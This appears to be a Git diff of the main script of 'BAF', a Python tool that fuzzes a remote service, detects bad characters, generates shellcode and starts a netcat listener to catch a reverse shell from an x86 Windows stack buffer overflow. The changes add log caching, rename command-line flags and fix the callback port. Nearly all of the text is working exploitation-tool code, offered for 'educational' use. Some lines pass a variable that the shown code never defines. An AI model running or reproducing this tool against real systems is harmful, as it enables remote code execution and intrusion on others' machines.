@@ -1,4 +1,4 @@
-# fucking aggressive buffer overflow scanner! Only use it for educational proposes!!!
+# Use BAF for educational proposes only! The contributors aren't responsible for the damage made by this tool!
 
 from connector import *
 from exploit import *
@@ -7,7 +7,6 @@ from logger import *
 from setup_exploit import *
 from netcat import *
 import argparse
-import random
 import os
 import sys
 import binascii
@@ -112,14 +111,12 @@ def start_bad_char_detection(prefix, length_of_overflow, r_ip_port, timeout=1):
             bad_chars = logging_console(
                 f"Type in bad chars (in format `\\x00\\x01\\x02\\x03` and ! to continue) {bad_chars_save}: ", "QUESTION", end="\n\r")
 
-        # all_characters = all_characters.split('\\x')[1:]
-
         if bad_chars == "!":
             break
 
         tries = 0
         bad_chars_save.append(bad_chars)
-        while not check_format(bad_chars=bad_chars_save[bad_chars_save.index(bad_chars)]) and tries < 3:
+        while (not check_format(bad_chars=bad_chars_save[bad_chars_save.index(bad_chars)]) and tries < 3) or bad_chars_save[bad_chars_save.index(bad_chars)] == "!":
             tries += 1
             bad_chars_save.remove(bad_chars)
             bad_chars = logging_console(
@@ -140,8 +137,7 @@ def start_bad_char_detection(prefix, length_of_overflow, r_ip_port, timeout=1):
 
         all_characters = "\\x"+"\\x".join(all_characters)
         loops += 1
-        # send(payload,
-        #      r_ip_port[0], r_ip_port[1], timeout)
+
     return bad_chars
 
 
@@ -150,7 +146,7 @@ def exploit_buffer_setup(shell_code, addr, prefix, offset):
     payload = exploit_buffer(shell_code, addr, prefix, offset)
 
 
-def start_exploitation(shell_code, addr, prefix, offset, r_ip_port, timeout):
+def start_exploitation(shell_code, addr, prefix, offset, port, r_ip_port, timeout):
     payload_thread = threading.Thread(
         target=exploit_buffer_setup, args=([shell_code, addr, prefix, offset]))
     payload_thread.start()
@@ -173,8 +169,8 @@ def start_exploitation(shell_code, addr, prefix, offset, r_ip_port, timeout):
         with open('payload.txt', 'a+') as file:
             file.write(str(payload))
     logging_console("Generated payload, saved in `payload.txt`", "POSITIVE")
-    logging_console(f"Starting netcat @ port {r_ip_port[1]}", "VERBOSE")
-    netcat(r_ip_port[1])
+    logging_console(f"Starting netcat @ port {port}", "VERBOSE")
+    netcat(port)
     logging_console("Sending payload...", "VERBOSE", end="\r")
 
     # sending without using `send()` function, because the shell code will be wrong after decoding and encoding it!
@@ -195,7 +191,12 @@ def generate_shellcode_main(ip_port: tuple, bad_chars: str):
     shell_code = generate_shellcode(ip_port, bad_chars)
 
 
-def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix="", prefixes="", buffer_count=0, len_of_overflow=0, offset_user=0, timeout=1, verbose: bool = False, escape_fuzz: bool = False, escape_chars="", escape_bad_char_detection=False, nobanner=False):
+def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix: str = "", prefixes: str = "", buffer_count: int = 0, len_of_overflow: int = 0, offset_user: int = 0, timeout: int = 1, verbose: bool = False, escape_fuzz: bool = False, escape_chars: str = "", escape_bad_char_detection: bool = False, nobanner: bool = False, output: str = "", overwrite: bool = False, bypass_logs: bool = False, nologging: bool = False):
+    logging_data = {}
+    if verbose:
+        init(v=True, save_output=output,
+             allowed_to_overwrite=overwrite, ip=r_ip_port[0])
+
     banner = """
 \x1b[91m ____ \x1b[32m    _   \x1b[91m  _____ 
 | __ )\x1b[32m   / \  \x1b[91m |  ___|
@@ -204,16 +205,13 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
 |____ \x1b[32m/_/   \_ \x1b[91m\_|    
                     
 \x1b[91m _____           _    _            \x1b[32m                                        _          \x1b[91m    ____   ___  _____ \x1b[39m                                      
-\x1b[91m|  ___|   _  ___| | _(_)_ __   __ _ \x1b[32m    __ _  __ _  __ _ _ __ ___  ___ ___(_)_   _____\x1b[91m   | __ ) / _ \|  ___|\x1b[39m   ___  ___ __ _ _ __  _ __   ___ _ __ \x1b[35mv1.0/stable\x1b[32m
+\x1b[91m|  ___|   _  ___| | _(_)_ __   __ _ \x1b[32m    __ _  __ _  __ _ _ __ ___  ___ ___(_)_   _____\x1b[91m   | __ ) / _ \|  ___|\x1b[39m   ___  ___ __ _ _ __  _ __   ___ _ __ \x1b[35mv1.2\x1b[32m
 \x1b[91m| |_ | | | |/ __| |/ / | '_ \ / _` | \x1b[32m  / _` |/ _` |/ _` | '__/ _ \/ __/ __| \ \ / / _ \ \x1b[91m |  _ \| | | | |_   \x1b[39m  / __|/ __/ _` | '_ \| '_ \ / _ \ '__|
 \x1b[91m|  _|| |_| | (__|   <| | | | | (_| | \x1b[32m | (_| | (_| | (_| | | |  __/\__ \__ \ |\ V /  __/\x1b[91m  | |_) | |_| |  _|  \x1b[39m  \__ \ (_| (_| | | | | | | |  __/ |   
 \x1b[91m|_|   \__,_|\___|_|\_\_|_| |_|\__, |  \x1b[32m \__,_|\__, |\__, |_|  \___||___/___/_| \_/ \___|\x1b[91m  |____/ \___/|_|    \x1b[39m  |___/\___\__,_|_| |_|_| |_|\___|_|   
 \x1b[91m                              |___/   \x1b[32m       |___/ |___/   Made with \x1b[31m<3                                                                                      """
     if not nobanner:
-        print(banner)
-
-    if verbose:
-        init(True)
+        print_banner(banner+"\n")
 
     logging_console("Starting Program", "INFO")
     logging_console("Trying to connect...", "VERBOSE", end="\r")
@@ -231,38 +229,74 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
             logging_console("Host is up! Trying to reconnect...", "POSITIVE")
             s = connect(r_ip_port)
 
-    # fuzzing
-    if not escape_fuzz:
-        if prefix and not prefixes:
-            length_of_overflow, offset = start_fuzzing(
-                s, prefix, r_ip_port, timeout, buffer_count, verbose)
+    escape_both_scans = False
+    if bypass_logs:
+        logging_data = backup_logs(input_output=True)[prefix]
+
+    if len(logging_data):
+        logging_console(
+            f"Found data inside log file ~/.BAF/{r_ip_port[0]}/{r_ip_port[0]}_result.json, bypassing fuzz and bad char scan", "VERBOSE")
+
+        try:
+            offset, bad_chars = logging_data['offset'], logging_data['bad_chars']
+            escape_both_scans = True
+        except KeyError:
+            logging_console(
+                "Log data is damaged, fuzz and bad char scan won't be bypassed", "WARNING")
+
+    if not escape_both_scans:
+        # fuzzing
+        if not escape_fuzz:
+            if prefix and not prefixes:
+                length_of_overflow, offset = start_fuzzing(
+                    s, prefix, r_ip_port, timeout, buffer_count, verbose)
+            else:
+                length_of_overflow = 0
+                offset = 0
+                for prefix in range(prefixes):
+                    len_of_overflow_small, offset_small = start_fuzzing(
+                        s, prefix, r_ip_port, timeout, buffer_count, verbose
+                    )
+                    logging_data.update(
+                        {
+                            prefix: {
+                                "length_of_overflow": len_of_overflow_small,
+                                "offset": offset_small
+                            }
+                        }
+                    )
+
         else:
-            length_of_overflow = 0
-            offset = 0
-            for prefix in range(prefixes):
-                len_of_overflow_small, offset_small = start_fuzzing(
-                    s, prefix, r_ip_port, timeout, buffer_count, verbose
-                )
+            logging_console("Escaped fuzz, will use given values", "POSITIVE")
+            logging_console(
+                "Note: BAF won't work as expected if the values are wrong!", "INFO")
+            length_of_overflow, offset = len_of_overflow, offset_user
+            logging_data.update(
+                {
+                    "length_of_overflow": length_of_overflow,
+                    "offset": offset
+                }
+            )
 
-    else:
-        logging_console("Escaped fuzz, will use given values", "POSITIVE")
-        logging_console(
-            "Note: BAF won't work as expected if the values are wrong!", "INFO")
-        length_of_overflow, offset = len_of_overflow, offset_user
+        # Scanning bad chars
+        if not escape_bad_char_detection:
+            bad_chars = start_bad_char_detection(
+                prefix, length_of_overflow, r_ip_port, timeout)
 
-    # Scanning bad chars
-    if not escape_bad_char_detection:
-        bad_chars = start_bad_char_detection(
-            prefix, length_of_overflow, r_ip_port, timeout)
+        else:
+            logging_console(
+                "Escaped bad character detection, will use given values", "POSITIVE")
+            logging_console(
+                "Note: BAF won't work as expected if the values are wrong!", "INFO")
+            bad_chars = escape_chars.split('\\')
+            for bad_char in bad_chars:
+                bad_chars[bad_chars.index(bad_char)] = "\\"+bad_char
 
-    else:
-        logging_console(
-            "Escaped bad character detection, will use given values", "POSITIVE")
-        logging_console(
-            "Note: BAF won't work as expected if the values are wrong!", "INFO")
-        bad_chars = escape_chars.split('\\')
-        for bad_char in bad_chars:
-            bad_chars[bad_chars.index(bad_char)] = "\\"+bad_char
+        bad_chars = ''.join(bad_chars)
+        logging_data.update({
+            "bad_chars": bad_chars
+        })
+
     reset_bin()
 
     addr = ""
@@ -273,9 +307,8 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
     if convention == "little":
         addr = little_endian(addr)
 
-    bad_chars = ''.join(bad_chars)
     shell_code_thread = threading.Thread(
-        target=generate_shellcode_main, args=([(l_ip_port[0], r_ip_port[1]), bad_chars]))
+        target=generate_shellcode_main, args=([(l_ip_port[0], l_ip_port[1]), bad_chars]))
     shell_code_thread.start()
 
     counter = 0
@@ -300,16 +333,25 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
     # Change the address to the needed format
     addr = binascii.unhexlify(addr)
 
+    logging_data.update({
+        "address": addr
+    })
+
+    if not escape_both_scans and not nologging:
+        backup_logs(input_output=False, data=str({
+            prefix: logging_data
+        }), replace=True)
+
     start_exploitation(xbuf, addr, prefix.replace('\\\\', '\\').encode(
         'latin1'), offset, l_ip_port[1], r_ip_port, timeout)
 
 
 if __name__ == '__main__':
     examples = f"""python3 {sys.argv[0]} --lhost 10.10.10.10 --lport 1337 --rhost 10.10.10.11 --rport 21 -be
-python3 {sys.argv[0]} --lhost 10.10.10.10 --lport 1337 --rhost 10.10.10.11 --rport 2337 --prefix="OVERFLOW_COMMAND" --timeout=5 --littleEndian
-python3 {sys.argv[0]} --lhost 10.10.10.10 --lport 1337 --rhost 10.10.10.11 --rport 22 --prefix="USER: " --timeout=2 --bigEndian -v --nobanner"""
+python3 {sys.argv[0]} --lhost 10.10.10.10 --lport 1337 --rhost 10.10.10.11 --rport 2337 --prefix="OVERFLOW_COMMAND" --timeout=5 --little-endian
+python3 {sys.argv[0]} --lhost 10.10.10.10 --lport 1337 --rhost 10.10.10.11 --rport 22 --prefix="USER: " --timeout=2 --big-endian -v --nobanner"""
     parser = argparse.ArgumentParser(
-        description="Fuzzing & Exploitation tool for BOF_winx64", epilog=examples, formatter_class=argparse.RawDescriptionHelpFormatter)
+        description="Fuzzing & Exploitation tool for x86 Windows Stack-Based Buffer Overflow", epilog=examples, formatter_class=argparse.RawDescriptionHelpFormatter)
     parser.add_argument("--lhost", metavar="", type=str,
                         help="Local IP", required=True)
     parser.add_argument("--lport", metavar="", type=int,
@@ -322,68 +364,80 @@ python3 {sys.argv[0]} --lhost 10.10.10.10 --lport 1337 --rhost 10.10.10.11 --rpo
                         type=str, help="Prefix to check (Standart value is '')")
     parser.add_argument("-ps", "--prefixes", metavar="",
                         type=str, help="Multiple prefixes in format `prefix1,prefix2,prefix3...`")
+    parser.add_argument("-o", "--output", metavar="",
+                        type=str, help="Save output into file")
     parser.add_argument("-t", "--timeout", metavar="", type=int,
                         help="Timeout for every request, standart value is 1")
-    parser.add_argument("-ef", "--escapeFuzz", metavar="", type=str,
-                        help="Escape fuzzing when values (length of buffer to trigger the overflow and the offset) are known! Format: length,offset")
-    parser.add_argument("-eb", "--escapeBadCharDetection", metavar="", type=str,
+    parser.add_argument("-ef", "--escape-fuzz", metavar="", type=str,
+                        help="Escape fuzzing when the offset is known!")
+    parser.add_argument("-eb", "--escape-bcd", metavar="", type=str,
                         help="Escape bad character detection when bad characters are given in format `\\x01\\x02\\x03...`")
     group1 = parser.add_mutually_exclusive_group(required=False)
     group1.add_argument("-v", "--verbose",
                         action="store_true", help="Verbose mode")
     group2 = parser.add_mutually_exclusive_group(required=False)
-    group2.add_argument("-le", "--littleEndian",
+    group2.add_argument("-le", "--little-endian",
                         action="store_true",
                         help="For Little-Endian order")
-    group2.add_argument("-be", "--bigEndian",
+    group2.add_argument("-be", "--big-endian",
                         action="store_true", help="For Big-Endian order")
     group3 = parser.add_mutually_exclusive_group(required=False)
     group3.add_argument("-nb", "--nobanner",
                         action="store_true", help="No banner at start")
+    group4 = parser.add_mutually_exclusive_group(required=False)
+    group4.add_argument("--allow-overwrite", action="store_true",
+                        help="Allow overwriting log file when file already exist")
+    group5 = parser.add_mutually_exclusive_group(required=False)
+    group5.add_argument("--no-logging", action="store_true",
+                        help="Prevents logging")
+    group6 = parser.add_mutually_exclusive_group(required=False)
+    group6.add_argument("--bypass-logs", action="store_true",
+                        help="Prevent log reading to rescan binary")
     args = parser.parse_args()
 
-    if not (args.littleEndian or args.bigEndian):
+    output = ""
+
+    if args.output:
+        output = args.output
+
+    if args.allow_overwrite and not args.output:
         logging_console(
-            "There should be one convention (--littleEndian or --bigEndian), type in -h or --help for help", "WARNING")
+            "Can not get overwrite permission if file is not given", "WARNING")
+
+    if not (args.little_endian or args.big_endian):
+        logging_console(
+            "There should be one convention (--little-endian or --big-endian), type in -h or --help for help", "WARNING")
         logging_console("Exiting program...", "WARNING")
 
-    if args.littleEndian and not args.bigEndian:
-        args.littleEndian = "little"
+    if args.little_endian and not args.big_endian:
+        args.little_endian = "little"
 
     else:
-        args.littleEndian = "big"
+        args.little_endian = "big"
 
     escapeFuzz, escapeBadChar = False, False
 
     if not args.prefix and args.prefixes:
         prefix = ""
+        logging_console(
+            f"--prefixes is in Beta phase, notice there could raise errors. If so feel free to report the issue at: {CYAN}https://github.com/TralseDev/BAF/issues{RESET}", "WARNING")
         prefixes = args.prefixes.split(",")
 
     if args.prefix and not args.prefixes:
         prefixes = ""
         prefix = args.prefix
 
-    if args.escapeFuzz:
-        if "," not in args.escapeFuzz:
-            logging_console(
-                "Invalid value for `escapeFuzz`. Check out the help menu (-h, --help)", "WARNING")
-            logging_console("Exiting program...", "WARNING")
-            exit()
-        if not len(args.escapeFuzz.split(',')) == 2:
-            logging_console(
-                "Invalid value for `escapeFuzz`. Check out the help menu (-h, --help)", "WARNING")
-            logging_console("Exiting program...", "WARNING")
-            exit()
-        len_of_overflow, offset_user = [
-            int(i) for i in args.escapeFuzz.split(',')]
+    if args.escape_fuzz:
+        offset_user = int(args.escape_fuzz)
+        len_of_overflow = offset_user + 8  # + 8 if x86
         escapeFuzz = True
 
     else:
         len_of_overflow, offset_user = 0, 0
 
-    if args.escapeBadCharDetection:
+    if args.escape_bcd:
         escapeBadChar = True
-        escape_chars = args.escapeBadCharDetection
+        escape_chars = args.escape_bcd
 
     else:
         escape_chars = ""
@@ -392,18 +446,27 @@ python3 {sys.argv[0]} --lhost 10.10.10.10 --lport 1337 --rhost 10.10.10.11 --rpo
     if args.nobanner:
         nobanner = True
 
-    if args.littleEndian and not args.bigEndian:
-        if args.timeout:
-            main((args.lhost, args.lport), (args.rhost, args.rport),
-                 args.littleEndian, prefix=prefix, prefixes=prefixes, timeout=args.timeout, verbose=args.verbose, len_of_overflow=len_of_overflow, offset_user=offset_user, escape_fuzz=escapeFuzz, escape_chars=escape_chars, escape_bad_char_detection=escapeBadChar, nobanner=nobanner)
-        else:
-            main((args.lhost, args.lport), (args.rhost, args.rport),
-                 args.littleEndian, prefix=prefix, prefixes=prefixes, verbose=args.verbose, len_of_overflow=len_of_overflow, offset_user=offset_user, escape_fuzz=escapeFuzz, escape_chars=escape_chars, escape_bad_char_detection=escapeBadChar, nobanner=nobanner)
+    try:
+        if args.little_endian and not args.big_endian:
+            if args.timeout:
+                main((args.lhost, args.lport), (args.rhost, args.rport),
+                     args.little_endian, prefix=prefix, prefixes=prefixes, timeout=args.timeout, verbose=args.verbose, len_of_overflow=len_of_overflow, offset_user=offset_user, escape_fuzz=escapeFuzz, escape_chars=escape_chars, escape_bad_char_detection=escapeBadChar, nobanner=nobanner, output=output, overwrite=overwrite, bypass_logs=args.bypass_logs, nologging=args.no_logging)
+            else:
+                main((args.lhost, args.lport), (args.rhost, args.rport),
+                     args.little_endian, prefix=prefix, prefixes=prefixes, verbose=args.verbose, len_of_overflow=len_of_overflow, offset_user=offset_user, escape_fuzz=escapeFuzz, escape_chars=escape_chars, escape_bad_char_detection=escapeBadChar, nobanner=nobanner, output=output, overwrite=overwrite, bypass_logs=args.bypass_logs, nologging=args.no_logging)
 
-    else:
-        if args.timeout:
-            main((args.lhost, args.lport), (args.rhost, args.rport),
-                 args.bigEndian, prefix=prefix, prefixes=prefixes, timeout=args.timeout, verbose=args.verbose, len_of_overflow=len_of_overflow, offset_user=offset_user, escape_fuzz=escapeFuzz, escape_chars=escape_chars, escape_bad_char_detection=escapeBadChar, nobanner=nobanner)
         else:
-            main((args.lhost, args.lport), (args.rhost, args.rport),
-                 args.bigEndian, prefix=prefix, prefixes=prefixes, verbose=args.verbose, len_of_overflow=len_of_overflow, offset_user=offset_user, escape_fuzz=escapeFuzz, escape_chars=escape_chars, escape_bad_char_detection=escapeBadChar, nobanner=nobanner)
+            if args.timeout:
+                main((args.lhost, args.lport), (args.rhost, args.rport),
+                     args.big_endian, prefix=prefix, prefixes=prefixes, timeout=args.timeout, verbose=args.verbose, len_of_overflow=len_of_overflow, offset_user=offset_user, escape_fuzz=escapeFuzz, escape_chars=escape_chars, escape_bad_char_detection=escapeBadChar, nobanner=nobanner, output=output, overwrite=overwrite, bypass_logs=args.bypass_logs, nologging=args.no_logging)
+            else:
+                main((args.lhost, args.lport), (args.rhost, args.rport),
+                     args.big_endian, prefix=prefix, prefixes=prefixes, verbose=args.verbose, len_of_overflow=len_of_overflow, offset_user=offset_user, escape_fuzz=escapeFuzz, escape_chars=escape_chars, escape_bad_char_detection=escapeBadChar, nobanner=nobanner, output=output, overwrite=overwrite, bypass_logs=args.bypass_logs, nologging=args.no_logging)
+    except KeyboardInterrupt:
+        logging_console("\nExiting by user action (^C)...", "WARNING")
+        exit()
+
+    except Exception as e:
+        logging_console(
+            f"An error occoured                        :\n{e}\nPlease feel free to report the issue at: {CYAN}https://github.com/TralseDev/BAF/issues{RESET}\n\nExiting program with status code -1...", "NEGATIVE")
+        exit(-1)
